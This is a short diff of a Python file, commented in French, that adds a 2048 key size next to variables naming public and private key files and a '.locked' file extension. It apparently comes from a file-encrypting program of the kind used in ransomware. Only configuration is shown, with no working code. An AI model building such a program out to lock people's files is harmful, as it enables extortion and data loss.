@@ -1,6 +1,7 @@
 import os
 
 #On définit ici les variables du programme
+keySize = 2048
 publicKey = "public.pem"
 privateKey = "private.pem"
 extensionToAppend = ".locked"
